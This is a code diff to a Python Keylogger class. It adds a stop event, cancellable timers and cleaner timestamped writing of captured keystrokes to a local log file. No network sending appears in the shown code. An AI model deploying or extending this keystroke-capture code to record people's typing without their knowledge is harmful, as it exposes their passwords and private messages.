@@ -17,6 +17,8 @@ class Keylogger:
         self.config = self._read_config()
         self.log_path = self._resolve_path(self.config["log_file"])
         self.text = ""
+        self._stop_event = threading.Event()
+        self.timer = None
 
     def _read_config(self):
         values = self.DEFAULTS.copy()
@@ -38,19 +40,23 @@ class Keylogger:
             path = self.config_path.parent / path
         return path.resolve()   
     def send_post_req(self):
+        if self._stop_event.is_set():
+            return
         
         try:
+            timestamp = datetime.datetime.now().isoformat(timespec='seconds')
             with open(self.log_path, "a", encoding="utf-8") as archivo:
-                if self.text == "":
-                    archivo.write(f"\n[{datetime.datetime.now().isoformat(timespec='seconds')}] --- IGNORE ---\n")
-
-                archivo.write(f"\n[{datetime.datetime.now().isoformat(timespec='seconds')}] {self.text}")
-                self.text = ""
+                if self.text:
+                    archivo.write(f"[{timestamp}] {self.text}\n")
+                    self.text = ""
+                else:
+                    archivo.write(f"[{timestamp}] --- IGNORE ---\n")
             
-            timer = threading.Timer(float(self.config["poll_seconds"]), self.send_post_req)
-            timer.start()
-        except:
-            print("Couldn't complete request!")
+            if not self._stop_event.is_set():
+                self.timer = threading.Timer(float(self.config["poll_seconds"]), self.send_post_req)
+                self.timer.start()
+        except Exception as e:
+            print(f"Couldn't complete request: {e}")
 
     def on_press(self, key):
 
@@ -85,11 +91,16 @@ class Keylogger:
             print("[INFO] Keylogger is disabled in the configuration.")
             return
         
+        self._stop_event.clear()
+        self.send_post_req()
         with keyboard.Listener(on_press=self.on_press) as listener:
-            self.send_post_req()
             self.listener = listener
             self.listener.join()
+
     def stop(self):
+        self._stop_event.set()
+        if self.timer is not None:
+            self.timer.cancel()
         if hasattr(self, 'listener') and self.listener is not None:
             self.listener.stop()
 
